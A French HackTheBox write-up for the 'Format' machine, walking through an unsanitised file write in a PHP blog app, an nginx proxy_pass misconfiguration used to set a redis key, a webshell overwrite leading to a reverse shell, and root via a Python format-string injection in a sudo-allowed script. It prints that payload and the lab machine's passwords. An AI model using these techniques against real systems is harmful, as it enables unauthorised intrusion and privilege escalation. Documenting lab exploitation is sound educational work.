---
title: Format - Medium (Linux)
img_path: "/assets/img/posts/Format"
categories:
- HackTheBox
- Write-up
tags:
- htb
- hack-the-box
- web
- vulnérabilités
- format-string-exploit
- templates
---

------------------------------------------------------------------------
## User
------------------------------------------------------------------------

### Nmap

```bash
└──╼ $full-nmap 10.129.229.3
Enumeration of open ports on : 10.129.229.3
Performing scan of the open port. The options are : -sC -Pn -A.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-31 13:46 BST
Nmap scan report for 10.129.229.3
Host is up (0.087s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 c397ce837d255d5dedb545cdf20b054f (RSA)
|   256 b3aa30352b997d20feb6758840a517c1 (ECDSA)
|_  256 fab37d6e1abcd14b68edd6e8976727d7 (ED25519)
80/tcp   open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Site doesn't have a title (text/html).
3000/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://microblog.htb:3000/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.51 seconds
```

On voit qu'il y a 3 ports, dont le 3000. Un port 22, un service web servi par nginx et donc le 3000.

En allant sur la page hébergée sur ce dernier, on a accès à une instance gitlab. On peut télécharger le code source de toute l'application hébergée sur app.microblog.htb.

Nous y reviendrons.

### Le site

En attendant, nous pouvons nous inscrire sur le site pour voir ce qu'il offre.

![1.png](1.png)

On peut créer un blog, ajouter le vhost dans /etc/hosts puis visiter le site.
![2.png](2.png)

On peut ajouter des sections etc.

![3.png](3.png)

Dernière *feature* intéressante, le fait de pouvoir devenir pro. Elle nous permet d'uploader des images. Pour 5$/mois, c'est *worth*, non ?

![4.png](4.png)
### Le code source

Revenons à l'instance gitlab. On a accès à tout le code source. Il s'avère que le site est une sorte de site de templating, comme ce qu'on peut avoir avec flask, mais en beaucoup moins puissant.

Présentons quelques portions de code intéressantes :

1) Si les variables post `txt` et `id` sont définies, selon le code ci-dessous, alors nous allons pouvoir écrire dans un fichier qui se nommera selon la variable `id` avec le contenu de la variable `txt`. Étant donné qu'il n'y a absolument aucune désinfection des paramètres, nous sommes en mesure d'écrire sur n'importe quel fichier pour lesquels nous avons les droits d'écriture. Cela nous permet également de lire le fichier. On peut sans conteste affirmer qu'il s'agit là d'un excellent boulot de développement !

```bash
if (isset($_POST['txt']) && isset($_POST['id'])) {
	chdir(getcwd() . "/../content");
	$txt_nl = nl2br($_POST['txt']);
	$html = "<div class = \"blog-text\">{$txt_nl}</div>";
	$post_file = fopen("{$_POST['id']}", "w");
	error_log($post_file);
	fwrite($post_file, $html);
	fclose($post_file);
	$order_file = fopen("order.txt", "a");
	fwrite($order_file, $_POST['id'] . "\n");
	fclose($order_file);
	header("Location: /edit?message=Section added!&status=success");

}
```

2) On voit ci-dessous comment est déterminée le fait d'être pro ou non. Il s'agit tout simplement de voir si la variable redis du champ `pro` est est à true ou false. Ce champ est mis à false dès la création du compte.

```php
function isPro() {
    if(isset($_SESSION['username'])) {
        $redis = new Redis();
        $redis->connect('/var/run/redis/redis.sock');
        $pro = $redis->HGET($_SESSION['username'], "pro");
        return strval($pro);
    }
    return "false";
}
```

```php
<SNIP>
        $redis->HSET(trim($_POST['username']), "pro", "false"); //not ready yet, license keys coming soon
        $_SESSION['username'] = trim($_POST['username']);
        header("Location: /dashboard?message=Registration successful!&status=success");
    }
}
```

3) Mais que permet exactement la version pro ? On sait qu'elle permet d'uploader des images, mais comment ? Dans le dossier `microblog-template`, on a accès à la fonction `provisionProUser()`. Cette fonction est très simple : si on est pro, le fichier `bulletproof.php` est copié dans le répertoire `/edit` de notre blog. Cela nous permet ensuite d'uploader des images dans le dossier `uploads`.

```php
function provisionProUser() {
    if(isPro() === "true") {
        $blogName = trim(urldecode(getBlogName()));
        system("chmod +w /var/www/microblog/" . $blogName);
        system("chmod +w /var/www/microblog/" . $blogName . "/edit");
        system("cp /var/www/pro-files/bulletproof.php /var/www/microblog/" . $blogName . "/edit/");
        system("mkdir /var/www/microblog/" . $blogName . "/uploads && chmod 700 /var/www/microblog/" . $blogName . "/uploads");
        system("chmod -w /var/www/microblog/" . $blogName . "/edit && chmod -w /var/www/microblog/" . $blogName);
    }
    return;
}

```

La marche à suivre semble dès lors la suivante :

1) Devenir pro en configurant la clé redis "pro" à `true`

2) Trouver un moyen soit d'abuser du fichier php d'upload, soit tout simplement de le réécrire. Nous verrons qu'il y a une autre méthode qui m'a échappée, encore plus simple.

3) Grâce à l'étape 2), choper un reverse shell.

### Devenir pro

C'est certainement la partie la plus difficile de cette machine. En effet, rien ne semble évident quant à la possibilité de devenir pro.

Après recherches, un coup de pouce, et en connectant les informations que nous avons glanées lors de l'énumération, on peut cependant penser à nginx.

Nginx est un webserver, qui peut aussi servir de proxy. En somme, on peut passer par nginx pour faire des requêtes à un autre service, par exemple un serveur front ou back. Mais on peut également faire des requêtes aux sockets unix.

Les sockets unix sont des fichiers qui servent de passerelles entre un client et un serveur (grosso-modo) afin de transmettre des requêtes entre les deux. Redis a la possibilité de fonctionner grâce aux sockets unix.

Pour voir si il y a une vulnérabilité d'exploitable avec cela en tête, intéressons nous aux fichiers nginx. Il y a de nombreuses possibilités pour les noms de fichiers nginx. Épargnons-nous les multiples essais, et arrivons directement à celui qui nous intéresse, lisible grâce à la LFI :

```conf
server {
	listen 80;
	listen [::]:80;
	root /var/www/microblog/app;
	index index.html index.htm index-nginx-debian.html;
	server_name microblog.htb;
	location / {
		return 404;
	}
		location = /static/css/health/ {
		resolver 127.0.0.1;
		proxy_pass http://css.microbucket.htb/health.txt;
	}
		location = /static/js/health/ {
		resolver 127.0.0.1;
		proxy_pass http://js.microbucket.htb/health.txt;
	}
		location ~ /static/(.*)/(.*) {
		resolver 127.0.0.1;
		proxy_pass http://$1.microbucket.htb/$2;
	}
}
```

Cette ligne : `proxy_pass http://$1.microbucket.htb/$2;` est intéressante. La première partie est un dossier de static ($1), suivie de la string `microbucket.htb` et se terminant par la ressource demandée ($2).

Cela veut dire qu'une demande à `microblog.htb/static/toto/titi` donnera http://toto.microblog.htb/titi.

[Ici](https://labs.detectify.com/2021/02/18/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/) un article expliquant bien ce type de mauvaise configuration. Il y a des exemples avec les sockets unix pour redis.

Pour pouvoir faire une requête à une socket unix, nous devrions donc avoir :

1) Le verbe à utiliser. Ici, c'est `HSET`.

2) La partie `/static/`

3) La requête redis : `/var/run/redis/redis.sock:username pro true`

4) Et enfin la dernière partie, qui peut-être n'importe quoi tant qu'elle existe, par exemple `/js`

Résultat :

![5.png](5.png)

Même si le serveur retourne une erreur, la requête a bien été effectué à la socket redis.

Nous voilà pro !

### bulletproof.php && RCE

Le plus dur est fait. Nous savons que nous avons des droits de lecture / écriture sur de nombreux fichiers, dont celui qui concerne l'upload d'image, `bulletproof.php` :

```php
        system("chmod +w /var/www/microblog/" . $blogName);
        system("chmod +w /var/www/microblog/" . $blogName . "/edit");
        system("cp /var/www/pro-files/bulletproof.php /var/www/microblog/" . $blogName . "/edit/");
        system("mkdir /var/www/microblog/" . $blogName . "/uploads && chmod 700 /var/www/microblog/" . $blogName . "/uploads");
        system("chmod -w /var/www/microblog/" . $blogName . "/edit && chmod -w /var/www/microblog/" . $blogName);
```


Ce fichier php, [après une recherche](https://github.com/samayo/bulletproof), ne s'avère pas spécialement vulnérable  à quoique ce soit, même s'il semble avoir fait [polémique](https://github.com/samayo/bulletproof/issues/90) quand au faux sentiment de sécurité qu'il procurerait.

L'idée qui semble la plus simple est donc de simplement réécrire ce fichier. On sait que nous avons les droits d'écriture dessus, et surtout on sait qu'il est exécutable en tant que fichier php. Il semble donc parfait pour nos besoins.

> Vraiment le plus simple ? Le write-up officiel procède différemment : vu que nous avons les droits en écriture / lecture sur le dossier uploads, il écrit simplement un fichier php dans ce dossier et l'exécute. Pour ma part, je n'avais *apriori* pas remarqué cette possibilité. Ce w-u étant en partie écrit bien après la résolution de la machine, j'ai du mal à me souvenir exactement ce qu'il en était de mon côté. Mais clairement, il y avait encore plus simple.

Réécriture du fichier :

![6.png](6.png)

Après requête sur le fichier, le reverse shell :

![7.png](7.png)

On voit qu'on est www-data. Le but sera de devenir cooper (on connaît son username en lisant le fichier /etc/password).

### Redis moi ton mot de passe

Maintenant que nous avons un pied dans le serveur en tant que www-data, le plus naturel pour trouver le mot de passe de cooper est tout simplement de consulter l'instance redis. Il ne reste qu'à dump toutes les clés présentes, et afficher celles qui nous intéressent :

![8.png](8.png)

On a le mot de passe de cooper : `cooper:zooperdoopercooper`. Cool !

------------------------------------------------------------------------
## Élévation de privilèges
------------------------------------------------------------------------

Cette partie est beaucoup plus simple que le user.

sudo -l :

```
User cooper may run the following commands on format:
	(root) /usr/bin/license
```

Le fichier license est un script qui sert à créer des licences pour les utilisateurs enregistrés.

Il ouvre d'abord un fichier qui semble très intéressant :

```python
secret = [line.strip() for line in open("/root/license/secret")][0]
```

Ensuite il le chiffre.

Par la suite, l'instance redis est ouverte, et il y a différentes étapes afin de valider l'octroie de licence.

Pour terminer, la licence est créée si toutes les étapes précédentes sont validées :

```python
license_key = (prefix + username + "{license.license}" +
firstlast).format(license=l)
print("")
print("Plaintext license key:")
print("------------------------------------------------------")
print(license_key)
print("")
```

On remarque rapidement que cette portion de code : `license_key = (prefix + username + "{license.license}" + firstlast).format(license=l)` est vulnérable au format string exploit en python.

[Ici](https://podalirius.net/en/articles/python-format-string-vulnerabilities/) un très bon article de podalirius sur le sujet.

L'idée est d'accéder à un objet, ici `license` instance de la classe `License()`, puis d'accéder à d'autres attributs via cette instance. La variable `secret` - notre cible - peut-être lue via  `__init__`, puis ensuite `__globals__`.

Ensuite, nous pouvons configurer un nouveau nom d'utilisateur pour `t` :

```bash
cooper@format:~$ redis-cli -s /var/run/redis/redis.sock HSET t username {license.__init__.__globals__[secret]}
(integer) 0
cooper@format:~$ redis-cli -s /var/run/redis/redis.sock HGET t username
"{license.__init__.__globals__[secret]}"
```

Et lui attribuer une licence via le script pour lire le secret , qui s’avérera - après décorticage - être le mot de passe de root :

```bash
cooper@format:~$ sudo /usr/bin/license -p t

Plaintext license key:
------------------------------------------------------
microblogunCR4ckaBL3Pa$$w0rd%6y:S<!:"${m_:c]?CB?U%3D.7cp?@6xTP\hBQ3xtt

Encrypted license key (distribute to customer):
------------------------------------------------------
gAAAAABk9EsEKkm2fe_Pexevukcv1YzoDprq9uoSn0nb6MUrFp8cdySPi0_V5s2Ll1u7wELhOoDjVL1l_jzmRLzvE3RDL37-AwsjuzxNhdX6W4oroaFxxThrtqJFeBrD9x7BocgQ0Cgu5MfDCOWpYgLm24cbgBYeX3dNcp4y_cjgvgnad2fXUx0=
cooper@format:~$ su root
Password: // unCR4ckaBL3Pa$$w0rd
root@format:/home/cooper# whoami
root
root@format:/home/cooper#
```
